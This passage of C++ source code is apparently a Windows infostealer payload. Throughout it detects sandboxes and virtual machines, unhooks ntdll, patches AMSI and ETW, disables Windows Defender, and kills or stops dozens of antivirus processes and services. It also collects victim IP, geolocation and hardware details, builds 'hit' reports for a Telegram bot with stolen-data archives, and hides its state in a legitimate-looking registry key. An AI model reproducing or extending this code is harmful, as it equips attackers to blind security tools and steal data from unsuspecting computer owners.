    std::vector<BYTE> buf(outBufLen);
    PIP_ADAPTER_ADDRESSES adapters = (PIP_ADAPTER_ADDRESSES)buf.data();
    if (api.GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, adapters, &outBufLen) != NOERROR)
        return false;

    for (PIP_ADAPTER_ADDRESSES p = adapters; p; p = p->Next) {
        if (p->PhysicalAddressLength != 6) continue;
        BYTE* mac = p->PhysicalAddress;
        if (mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) return true;
        if (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) return true;
        if (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56) return true;
        if (mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27) return true;
        if (mac[0] == 0x00 && mac[1] == 0x16 && mac[2] == 0x3E) return true;
        if (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0x42) return true;
    }
    return false;
}

static bool checkLowResources() {
    MEMORYSTATUSEX mem = {};
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem)) {
        if (mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))
            return true;
    }

    ULARGE_INTEGER freeBytes, totalBytes, totalFree;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFree)) {
        if (totalBytes.QuadPart < (60ULL * 1024 * 1024 * 1024))
            return true;
    }

    return false;
}

static bool checkLowUptime() {
    return GetTickCount() < 300000;
}

static bool checkAnalysisDlls() {
    const char* analysisDlls[] = {
        OX("sbiedll.dll"), OX("api_log.dll"), OX("dirwatch.dll"),
        OX("pstorec.dll"), OX("vmcheck.dll"), OX("sand.dll"), OX("sxin.dll"),
        OX("cuckoomon.dll"), nullptr
    };
    for (int i = 0; analysisDlls[i]; i++) {
        if (GetModuleHandleA(analysisDlls[i]))
            return true;
    }
    return false;
}

static bool checkRecentFiles() {
    char recentPath[MAX_PATH] = {};
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_RECENT, nullptr, 0, recentPath))) {
        WIN32_FIND_DATAA fd;
        std::string pattern = std::string(recentPath) + "\\*";
        HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) return true;
        int count = 0;
        do {
            if (fd.cFileName[0] == '.') continue;
            count++;
        } while (FindNextFileA(h, &fd) && count < 5);
        FindClose(h);
        if (count < 5) return true;
    }
    return false;
}

static bool checkCPUIDHypervisor() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);
    // Bit 31 of ECX indicates hypervisor presence
    if (!(cpuInfo[2] & (1 << 31)))
        return false;

    // Query hypervisor vendor ID to exclude VBS (Windows Virtualization-Based Security)
    // VBS uses "Microsoft Hv" which runs on physical machines too
    __cpuid(cpuInfo, 0x40000000);
    char vendor[13] = {};
    memcpy(vendor + 0, &cpuInfo[1], 4);  // EBX
    memcpy(vendor + 4, &cpuInfo[2], 4);  // ECX
    memcpy(vendor + 8, &cpuInfo[3], 4);  // EDX
    vendor[12] = 0;

    // Only flag real VM vendors, NOT Microsoft Hv (could be VBS on physical)
    if (_stricmp(vendor, "VMwareVMware") == 0) return true;
    if (_stricmp(vendor, "VBoxVBoxVBox") == 0) return true;
    if (_stricmp(vendor, "KVMKVMKVM") == 0) return true;
    if (_stricmp(vendor, "XenVMMXenVMM") == 0) return true;
    if (_stricmp(vendor, "prl hyperv") == 0) return true;  // Parallels
    if (_stricmp(vendor, " lrpepyh vr") == 0) return true;  // Parallels (reversed)

    return false;
}

static bool checkVMDevices() {
    const char* vmDevices[] = {
        OX("\\\\.\\VBoxGuest"), OX("\\\\.\\VBoxMiniRdrDN"),
        OX("\\\\.\\vmci"), OX("\\\\.\\HGFS"),
        OX("\\\\.\\pipe\\VBoxMiniRdDN"), OX("\\\\.\\pipe\\VBoxTrayIPC"),
        nullptr
    };
    for (int i = 0; vmDevices[i]; i++) {
        HANDLE h = CreateFileA(vmDevices[i], GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (h != INVALID_HANDLE_VALUE) {
            CloseHandle(h);
            return true;
        }
    }
    return false;
}

static bool isInSandbox() {
    int score = 0;
    if (checkCPUIDHypervisor()) score += 4;
    if (checkVMDevices()) score += 4;
    if (checkSandboxUsername()) score += 2;
    if (checkSandboxProcesses()) score += 3;
    if (checkSandboxMac()) score += 3;
    if (checkLowResources()) score += 1;
    if (checkLowUptime()) score += 1;
    if (checkAnalysisDlls()) score += 3;
    if (checkRecentFiles()) score += 1;
    // Require strong signal (real VM vendor / tools), not uptime alone
    return score >= 6;
}

// === Feature: Anti-Antivirus ===

static bool unhookNtdll() {
    HANDLE hFile = CreateFileA(OX("C:\\Windows\\System32\\ntdll.dll"),
        GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMap = CreateFileMappingA(hFile, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    CloseHandle(hFile);
    if (!hMap) return false;

    LPVOID pMapped = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!pMapped) return false;

    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
    if (!hNtdll) {
        UnmapViewOfFile(pMapped);
        return false;
    }

    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER textSec = IMAGE_FIRST_SECTION(ntHdr);
    for (WORD i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (memcmp(textSec[i].Name, ".text", 5) == 0) {
            void* textAddr = (void*)((BYTE*)hNtdll + textSec[i].VirtualAddress);
            SIZE_T textSize = textSec[i].Misc.VirtualSize;

            PIMAGE_DOS_HEADER mappedDos = (PIMAGE_DOS_HEADER)pMapped;
            PIMAGE_NT_HEADERS mappedNt = (PIMAGE_NT_HEADERS)((BYTE*)pMapped + mappedDos->e_lfanew);
            PIMAGE_SECTION_HEADER mappedText = IMAGE_FIRST_SECTION(mappedNt);
            for (WORD j = 0; j < mappedNt->FileHeader.NumberOfSections; j++) {
                if (memcmp(mappedText[j].Name, ".text", 5) == 0) {
                    void* srcAddr = (void*)((BYTE*)pMapped + mappedText[j].VirtualAddress);
                    DWORD oldProtect = 0;
                    if (VirtualProtect(textAddr, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                        memcpy(textAddr, srcAddr, textSize);
                        VirtualProtect(textAddr, textSize, oldProtect, &oldProtect);
                        FlushInstructionCache(GetCurrentProcess(), textAddr, textSize);
                        UnmapViewOfFile(pMapped);
                        return true;
                    }
                    break;
                }
            }
            break;
        }
    }

    UnmapViewOfFile(pMapped);
    return false;
}

static bool patchAmsi() {
    HMODULE hAmsi = LoadLibraryA(OX("amsi.dll"));
    if (!hAmsi) return false;

    FARPROC proc = GetProcAddress(hAmsi, OX("AmsiScanBuffer"));
    if (!proc) return false;

    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect = 0;
    if (VirtualProtect(proc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(proc, patch, sizeof(patch));
        VirtualProtect(proc, sizeof(patch), oldProtect, &oldProtect);
        FlushInstructionCache(GetCurrentProcess(), proc, sizeof(patch));
        return true;
    }
    return false;
}

static bool isAdmin() {
    BOOL isElevated = FALSE;
    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(elevation);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, size, &size))
            isElevated = elevation.TokenIsElevated;
        CloseHandle(hToken);
    }
    return isElevated != FALSE;
}

static bool patchEtw() {
    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
    if (!hNtdll) return false;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, OX("EtwEventWrite"));
    if (!pEtwEventWrite) return false;

    // patch: xor rax,rax; ret (x64) or xor eax,eax; ret (x86)
#ifdef _WIN64
    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
#else
    unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
    DWORD oldProtect = 0;
    if (VirtualProtect((void*)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy((void*)pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect((void*)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
        FlushInstructionCache(GetCurrentProcess(), (void*)pEtwEventWrite, sizeof(patch));
        return true;
    }
    return false;
}

static bool patchEtwFull() {
    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
    if (!hNtdll) return false;

    // Patch EtwEventWrite
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, OX("EtwEventWrite"));
    if (pEtwEventWrite) {
#ifdef _WIN64
        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
#else
        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
        DWORD oldProtect = 0;
        if (VirtualProtect((void*)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy((void*)pEtwEventWrite, patch, sizeof(patch));
            VirtualProtect((void*)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
            FlushInstructionCache(GetCurrentProcess(), (void*)pEtwEventWrite, sizeof(patch));
        }
    }

    // Patch EtwEventWriteFull
    FARPROC pEtwEventWriteFull = GetProcAddress(hNtdll, OX("EtwEventWriteFull"));
    if (pEtwEventWriteFull) {
#ifdef _WIN64
        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
#else
        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
        DWORD oldProtect = 0;
        if (VirtualProtect((void*)pEtwEventWriteFull, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy((void*)pEtwEventWriteFull, patch, sizeof(patch));
            VirtualProtect((void*)pEtwEventWriteFull, sizeof(patch), oldProtect, &oldProtect);
            FlushInstructionCache(GetCurrentProcess(), (void*)pEtwEventWriteFull, sizeof(patch));
        }
    }

    // Patch NtTraceEvent
    FARPROC pNtTraceEvent = GetProcAddress(hNtdll, OX("NtTraceEvent"));
    if (pNtTraceEvent) {
#ifdef _WIN64
        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
#else
        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif
        DWORD oldProtect = 0;
        if (VirtualProtect((void*)pNtTraceEvent, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            memcpy((void*)pNtTraceEvent, patch, sizeof(patch));
            VirtualProtect((void*)pNtTraceEvent, sizeof(patch), oldProtect, &oldProtect);
            FlushInstructionCache(GetCurrentProcess(), (void*)pNtTraceEvent, sizeof(patch));
        }
    }

    return true;
}

static void disableDefenderRealtime() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        OX("SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection"),
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExA(hKey, OX("DisableRealtimeMonitoring"), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        OX("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"),
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExA(hKey, OX("DisableRealtimeMonitoring"), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        OX("SOFTWARE\\Policies\\Microsoft\\Windows Defender"),
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD val = 1;
        RegSetValueExA(hKey, OX("DisableAntiSpyware"), 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
}

static void addDefenderExclusions() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);

    char appData[MAX_PATH];
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appData);

    std::string exeDir(exePath);
    size_t slash = exeDir.find_last_of("\\/");
    if (slash != std::string::npos)
        exeDir = exeDir.substr(0, slash);

    const char* dirs[] = { exePath, exeDir.c_str(), appData, nullptr };

    for (int i = 0; dirs[i]; i++) {
        std::string cmd = std::string(OX("powershell -NoProfile -WindowStyle Hidden -Command \""));
        cmd += std::string(OX("Add-MpPreference -ExclusionPath '")) + std::string(dirs[i]) + std::string(OX("' -ErrorAction SilentlyContinue; "));
        cmd += std::string(OX("Add-MpPreference -ExclusionProcess '")) + std::string(dirs[i]) + std::string(OX("' -ErrorAction SilentlyContinue\""));
        runProcessHidden(cmd);
    }
}

static void killAvProcesses() {
    const char* avProcs[] = {
        OX("MsMpEng.exe"), OX("MsSense.exe"), OX("SenseCE.exe"), OX("SenseIR.exe"),
        OX("SecurityHealthService.exe"), OX("SecurityHealthSystray.exe"),
        OX("MpCmdRun.exe"), OX("NisSrv.exe"), OX("SearchIndexer.exe"),
        OX("avp.exe"), OX("kavfs.exe"), OX("kavfswl.exe"),
        OX("avgsvc.exe"), OX("avgnt.exe"), OX("avguard.exe"), OX("avgcsrvx.exe"),
        OX("avscan.exe"), OX("avwebgrd.exe"),
        OX("bdagent.exe"), OX("bdredline.exe"), OX("vsserv.exe"), OX("bdwfserv.exe"),
        OX("f-secure.exe"), OX("fsma32.exe"), OX("fssm32.exe"),
        OX("mbam.exe"), OX("mbamtray.exe"), OX("mbamservice.exe"), OX("MBAMService.exe"),
        OX("mcshield.exe"), OX("mcafee.exe"), OX("mcconsol.exe"), OX("mmssvc.exe"),
        OX("spbbcsvc.exe"), OX("srtsp.exe"), OX("srtsp64.exe"), OX("ccSvcHst.exe"),
        OX("rstray.exe"), OX("ccsetmgr.exe"), OX("ccApp.exe"),
        OX("ekrn.exe"), OX("egui.exe"), OX("ekrnEpmw.exe"),
        OX("kav.exe"), OX("kavsvc.exe"),
        OX("clamd.exe"), OX("clamwin.exe"), OX("clamtray.exe"),
        OX("sophos.exe"), OX("savservice.exe"), OX("swi_service.exe"),
        OX("hbsicon.exe"), OX("housecall.exe"), OX("tmbmsrv.exe"),
        OX("pav.exe"), OX("pavsrv.exe"), OX("psimsvc.exe"),
        OX("zanda.exe"), OX("zaservice.exe"), OX("zlclient.exe"),
        OX("windefend.exe"),
        nullptr
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            char name[MAX_PATH];
            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            for (int i = 0; avProcs[i]; i++) {
                if (_stricmp(name, avProcs[i]) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProc) {
                        TerminateProcess(hProc, 1);
                        CloseHandle(hProc);
                    }
                    break;
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static void stopAvServices() {
    const char* services[] = {
        OX("WinDefend"), OX("WdNisSvc"), OX("Sense"), OX("WdBoot"),
        OX("MBAMService"), OX("McAfeeDLPAgentService"),
        OX("AVP16.0.0"), OX("kavfs"), OX("kavfss"),
        OX("avgsvc"), OX("AVG Service"),
        OX("bdagent"), OX("vsserv"),
        OX("fsma32"), OX("f-secure"),
        OX("clamd"), OX("ClamWin"),
        OX("savservice"), OX("Sophos Agent"),
        OX("tmbmsrv"), OX("HouseCall"),
        OX("zaservice"),
        nullptr
    };

    for (int i = 0; services[i]; i++) {
        std::string cmd = "sc stop \"" + std::string(services[i]) + "\"";
        runProcessHidden(cmd);
        cmd = "sc config \"" + std::string(services[i]) + "\" start= disabled";
        runProcessHidden(cmd);
    }
}

static void runAntiAV() {
    unhookNtdll();
    patchAmsi();
    patchEtwFull();

    if (isAdmin()) {
        disableDefenderRealtime();
        addDefenderExclusions();
        killAvProcesses();
        stopAvServices();
    }
}

// === Feature: Bypass VirusTotal (enhanced) ===

static bool hasUserActivity() {
    LASTINPUTINFO lii = {};
    lii.cbSize = sizeof(lii);
    if (GetLastInputInfo(&lii)) {
        DWORD idleMs = GetTickCount() - lii.dwTime;
        if (idleMs < 60000)
            return true;
    }
    for (int vk = 0x08; vk <= 0x5A; vk++) {
        if (GetAsyncKeyState(vk) & 0x8000)
            return true;
    }
    return false;
}

static void applyVTBypass() {
    // Short delay with API activity — long sleeps make real hits look "broken"
    DWORD totalDelay = 5000 + (rand() % 7000);
    DWORD steps = 8 + (rand() % 5);
    DWORD stepDelay = totalDelay / steps;

    for (DWORD i = 0; i < steps; i++) {
        // Mix of different sleep methods to evade simple Sleep hooks
        if (i % 3 == 0) {
            Sleep(stepDelay);
        } else if (i % 3 == 1) {
            // NtDelayExecution via WaitForSingleObject on a NULL handle
            HANDLE hEvent = CreateEventA(nullptr, FALSE, FALSE, nullptr);
            if (hEvent) {
                WaitForSingleObject(hEvent, stepDelay);
                CloseHandle(hEvent);
            } else {
                Sleep(stepDelay);
            }
        } else {
            // SleepEx (alertable)
            SleepEx(stepDelay, FALSE);
        }

        // API hammering - diverse calls to make hook detection harder
        GetTickCount();
        GetTickCount64();
        LARGE_INTEGER pc;
        QueryPerformanceCounter(&pc);

        char buf[128];
        DWORD sz = sizeof(buf);
        GetUserNameA(buf, &sz);
        GetComputerNameA(buf, &sz);
        GetSystemDirectoryA(buf, sizeof(buf));
        GetWindowsDirectoryA(buf, sizeof(buf));

        // Check for user activity - if detected, break early (real user)
        if (hasUserActivity())
            break;
    }
}

// === Feature: Randomized delay before data capture ===
// Delays heavy data collection (browser, screen, webcam, mic) by a random
// interval so the payload doesn't start grabbing immediately at predictable
// moments (boot, auto-start, update-hit).

static void randomDelayBeforeCapture() {
    DWORD totalDelay = 30000 + (rand() % 150000); // 30-180 seconds
    DWORD steps = 15 + (rand() % 10);
    DWORD stepDelay = totalDelay / steps;

    for (DWORD i = 0; i < steps; i++) {
        if (i % 3 == 0) {
            Sleep(stepDelay);
        } else if (i % 3 == 1) {
            HANDLE hEvent = CreateEventA(nullptr, FALSE, FALSE, nullptr);
            if (hEvent) {
                WaitForSingleObject(hEvent, stepDelay);
                CloseHandle(hEvent);
            } else {
                Sleep(stepDelay);
            }
        } else {
            SleepEx(stepDelay, FALSE);
        }

        // Diverse API calls to avoid simple hook detection
        GetTickCount();
        GetTickCount64();
        LARGE_INTEGER pc;
        QueryPerformanceCounter(&pc);
        char buf[64];
        DWORD sz = sizeof(buf);
        GetComputerNameA(buf, &sz);

        // If user is active, proceed immediately (real user, not sandbox)
        if (hasUserActivity())
            break;
    }
}

// === Info collection ===
//
// A snapshot of everything the "quick info" block reports. Collected once and
// reused so the hit message, the change message and the periodic update all
// agree on what "current" means.
struct QuickInfo {
    std::string pcName;
    std::string ip;
    std::string cpu;
    std::string gpu;
    std::string os;
    std::string geo;      // "Country, Region, City"
    std::string isp;
    bool vpn = false;
};

static QuickInfo collectQuickInfo() {
    QuickInfo qi;
    qi.pcName = getPCName();
    qi.ip = getPublicIP();
    qi.cpu = getCPU();
    qi.gpu = getGPU();
    qi.os = getOSVersion();
    GeoInfo g = getGeoInfo();
    qi.geo = formatGeo(g);
    qi.isp = g.isp;
    qi.vpn = g.vpn;
    return qi;
}

// The message the user opens the file to receive: brand, session, and the full
// quick-info block with the archive password.
static std::string buildHitMessage(const PayloadConfig& cfg, const QuickInfo& qi,
    const std::string& password) {
    std::string msg;
    msg += std::string(kMsgBrand) + "\n";
    msg += "New hit on sessionid: " + cfg.sessionId + "!\n";
    msg += "\n";
    msg += "Quick info:\n";
    // The builder records which file was bound; fall back to our own name.
    const std::string opened = cfg.originalName.empty() ? getExeName() : cfg.originalName;
    msg += "File opened: " + opened + "\n";
    msg += "PC Name: " + qi.pcName + "\n";
    msg += "IP: " + qi.ip + "\n";
    msg += "Geolocation: " + qi.geo + "\n";
    msg += "CPU: " + qi.cpu + "\n";
    msg += "GPU: " + qi.gpu + "\n";
    msg += "OS: " + qi.os + "\n";
    msg += "Password for archive: " + (password.empty() ? std::string("(none)") : password) + "\n";
    msg += "\n";
    msg += "Download archive by clicking attachment.\n";
    msg += "(" + getTimestamp() + ")";
    return msg;
}

// Sent when the machine starts running the payload.
//
// Leads with the machine name so the operator can tell at a glance which host
// the notification belongs to. The previous wording ("Pc went online: <name>
// From session id: <id> went online.") said the same thing three times and
// buried the only part worth scanning for.
static std::string buildOnlineMessage(const PayloadConfig& cfg) {
    return getPCName() + " went online | session: " + cfg.sessionId;
}

// Sent on shutdown, best-effort (see the exit handler in WinMain).
static std::string buildOfflineMessage(const PayloadConfig& cfg) {
    return getPCName() + " went offline | session: " + cfg.sessionId;
}

// Sent when the quick-info fingerprint changes while running (typically the IP
// moved). Only the fields that actually changed are listed.
static std::string buildQuickChangeMessage(const PayloadConfig& cfg,
    const QuickInfo& oldInfo, const QuickInfo& now) {
    std::string msg;
    msg += std::string(kMsgBrand) + "\n";
    msg += now.pcName + " From session: " + cfg.sessionId + ": Quick info has changed.\n";

    // IP is the headline change, with the VPN verdict alongside it.
    if (oldInfo.ip != now.ip) {
        msg += "IP (old) " + oldInfo.ip + " > IP (new) " + now.ip +
            " | VPN Detected: " + (now.vpn ? "Yes" : "No") + "\n";
    } else if (oldInfo.vpn != now.vpn) {
        msg += "IP " + now.ip + " | VPN Detected: " + (now.vpn ? "Yes" : "No") + "\n";
    }

    // Any other field that moved, in the same (old) > (new) shape.
    if (oldInfo.geo != now.geo)
        msg += "Geolocation (old) " + oldInfo.geo + " > Geolocation (new) " + now.geo + "\n";
    if (oldInfo.isp != now.isp && !now.isp.empty())
        msg += "ISP (old) " + oldInfo.isp + " > ISP (new) " + now.isp + "\n";
    if (oldInfo.pcName != now.pcName)
        msg += "PC Name (old) " + oldInfo.pcName + " > PC Name (new) " + now.pcName + "\n";
    if (oldInfo.cpu != now.cpu)
        msg += "CPU (old) " + oldInfo.cpu + " > CPU (new) " + now.cpu + "\n";
    if (oldInfo.gpu != now.gpu)
        msg += "GPU (old) " + oldInfo.gpu + " > GPU (new) " + now.gpu + "\n";
    if (oldInfo.os != now.os)
        msg += "OS (old) " + oldInfo.os + " > OS (new) " + now.os + "\n";

    msg += "(" + getTimestamp() + ")";
    return msg;
}

// Sent when a re-check turns up something new (fresh browser data etc.), with
// the archive attached. `planned` distinguishes a scheduled re-check from one
// triggered by a detected change.
//
// Like the online/offline notices this leads with the machine name. The brand
// moved to the footer as a signature so it still identifies the generation
// without being the first thing on the line.
//
// `withAttachment` is false for the boot-time change notice when the config
// captured nothing: the message still has to make sense without a file under it.
static std::string buildUpdatedInfoMessage(const PayloadConfig& cfg,
    const std::string& password, bool planned, bool withAttachment = true) {
    std::string msg;
    msg += getPCName() + " | updated info on session: " + cfg.sessionId + "\n";
    if (withAttachment)
        msg += "Password: " + (password.empty() ? std::string("(none)") : password) + "\n";
    msg += "Planned check: " + std::string(planned ? "Yes" : "No") + "\n";
    msg += "\n";
    msg += withAttachment ? "Download the archive by clicking on attachment.\n"
                          : "Change detected, but nothing new to attach.\n";
    msg += std::string(kMsgBrand) + "\n";
    msg += "(" + getTimestamp() + ")";
    return msg;
}

// Stable comparison key for a QuickInfo snapshot. Only fields that are expected
// to move at runtime are included; ISP is tracked separately because it often
// changes together with the IP and would otherwise double-report.
static std::string fingerprintOf(const QuickInfo& qi) {
    return qi.pcName + "|" + qi.ip + "|" + qi.cpu + "|" + qi.gpu + "|" + qi.os +
        "|" + qi.geo + "|" + (qi.vpn ? "vpn" : "novpn");
}

// ---- Boot-to-boot snapshot ----
//
// The in-memory comparison in the monitor loops only sees a single run, so a
// reboot would otherwise reset the baseline and nothing that happened while the
// machine was off would ever be reported. The last fingerprint is therefore
// kept in HKCU: normal runs are supposed to leave no files on disk, and the
// registry already carries the persistence hook.
//
// The key is a real Windows one, so the value reads as another cache entry
// rather than as an obvious artifact.
static const char* kStateKey = "Software\\Microsoft\\Windows\\CurrentVersion\\AppHost";
static const char* kStateValue = "CacheState";
static const char* kStateSizeValue = "CacheSize";

static std::string loadStateFingerprint() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, kStateKey, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
        return std::string();

    char buf[1024] = {};
    DWORD size = sizeof(buf) - 1;
    DWORD type = 0;
    LONG rc = RegQueryValueExA(hKey, kStateValue, nullptr, &type, (BYTE*)buf, &size);
    RegCloseKey(hKey);

    if (rc != ERROR_SUCCESS || type != REG_SZ)
        return std::string();
    buf[size] = 0;
    return std::string(buf);
}

static void saveStateFingerprint(const std::string& fp) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, kStateKey, 0, nullptr,
            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr) != ERROR_SUCCESS)
        return;
    RegSetValueExA(hKey, kStateValue, 0, REG_SZ, (const BYTE*)fp.c_str(), (DWORD)fp.size() + 1);
    RegCloseKey(hKey);
}

// Size of the archive built on the previous run. This is the primary boot-time
// signal: it tracks the captured *data* rather than the machine's identity, so
// fresh browser data or a changed desktop is noticed even when the IP has not
// moved — which the fingerprint alone can never see. Returns 0 when unset.
static DWORD loadStateArchiveSize() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, kStateKey, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
        return 0;

    DWORD value = 0, size = sizeof(value), type = 0;
    LONG rc = RegQueryValueExA(hKey, kStateSizeValue, nullptr, &type, (BYTE*)&value, &size);
    RegCloseKey(hKey);

    if (rc != ERROR_SUCCESS || type != REG_DWORD || size != sizeof(value))
        return 0;
    return value;
}

static void saveStateArchiveSize(DWORD bytes) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, kStateKey, 0, nullptr,
            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr) != ERROR_SUCCESS)
        return;
    RegSetValueExA(hKey, kStateSizeValue, 0, REG_DWORD, (const BYTE*)&bytes, sizeof(bytes));
    RegCloseKey(hKey);
}

// ---- Offline notice ----
//
// There is no server watching for a missing heartbeat, so the only chance to
// report "went offline" is while this process is still running and being asked
// to exit. That covers logoff, shutdown and a clean kill; it does NOT cover a
// power loss or a dropped network, where nothing gets to run. Sending may also
// fail during shutdown because the network stack is already going down — this
// is deliberately best-effort and never blocks exit for long.
//
// This binary is WIN32-subsystem, so it has no console and
// SetConsoleCtrlHandler() never sees CTRL_LOGOFF_EVENT/CTRL_SHUTDOWN_EVENT —
// the notice could therefore never fire. What a GUI process actually receives
// is WM_QUERYENDSESSION/WM_ENDSESSION on a *top-level* window, so we keep one
// hidden window alive purely to catch it, and the wait loops below pump
// messages: a plain Sleep() would leave the broadcast queued until Windows
// killed the process.
static PayloadConfig g_offlineCfg;
static std::atomic<bool> g_offlineSent{ false };

static void sendOfflineOnce() {
    if (g_offlineSent.exchange(true))
        return;
    if (g_offlineCfg.botToken.empty() || g_offlineCfg.chatId.empty())
        return;
    // Short HTTP budget: see g_shutdownSend. Set before the send so the session
    // httpPost opens inside picks it up.
    g_shutdownSend = true;
    sendTelegram(g_offlineCfg, buildOfflineMessage(g_offlineCfg));
}

static BOOL WINAPI consoleCtrlHandler(DWORD type) {
    switch (type) {
    case CTRL_C_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
        sendOfflineOnce();
        break;
    default:
        break;
    }
    return FALSE; // let the default handler run so the process still exits
}

static LRESULT CALLBACK sessionWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_QUERYENDSESSION:
        // Let the shutdown proceed; the notice goes out on WM_ENDSESSION, which
        // is the definitive "we really are going away".
        return TRUE;
    case WM_ENDSESSION:
        if (wParam)
            sendOfflineOnce();
        return 0;
    case WM_CLOSE:
        DestroyWindow(hWnd);
        return 0;
    default:
        return DefWindowProcA(hWnd, msg, wParam, lParam);
    }
}

// Sleep for `ms` while still dispatching messages. Used by the monitor loops in
// place of Sleep() so a shutdown broadcast is acted on immediately instead of
// sitting in the queue until the process is torn down.
static void waitPumping(DWORD ms) {
    const DWORD start = GetTickCount();
    for (;;) {
        const DWORD elapsed = GetTickCount() - start;
        if (elapsed >= ms)
            return;
        const DWORD remain = ms - elapsed;
        // One-second slices: short enough that a shutdown arriving mid-wait is
        // not missed for long, cheap enough to be irrelevant over a 60 s poll.
        const DWORD slice = remain > 1000 ? 1000 : remain;
        if (MsgWaitForMultipleObjectsEx(0, nullptr, slice, QS_ALLINPUT,
                MWMO_INPUTAVAILABLE) == WAIT_OBJECT_0) {
            MSG msg;
            while (PeekMessageA(&msg, nullptr, 0, 0, PM_REMOVE)) {
